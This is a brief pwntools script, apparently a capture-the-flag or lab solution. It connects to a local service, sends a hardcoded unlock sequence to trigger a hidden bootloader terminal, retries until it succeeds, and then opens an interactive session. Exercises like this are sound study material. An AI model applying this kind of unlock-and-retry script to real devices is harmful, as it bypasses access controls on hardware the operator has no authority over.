from pwn import *
import time

HOST = "localhost"
PORT = 4000
SECRET_SEQ = b"JPE1704TKS\n"   # secret sequence + enter
TRIGGER_MSG = b"Bootloader terminal triggered!"

def try_unlock():
    io = remote(HOST, PORT, timeout=5)
    io.send(SECRET_SEQ)  # send sequence immediately
    try:
        data = io.recvuntil(TRIGGER_MSG, timeout=2)
        if TRIGGER_MSG in data:
            print("[+] Bootloader unlocked!")
            return io
    except EOFError:
        pass

    io.close()
    return None

def main():
    while True:
        print("[*] Attempting unlock...")
        conn = try_unlock()
        if conn:
            print("[+] Connected to bootloader terminal. Interactive mode enabled.")
            conn.interactive()  # hand over control to user
            break
        else:
            print("[!] Unlock failed, retrying...")
            time.sleep(1)  # short delay before retry

if __name__ == "__main__":
    main()
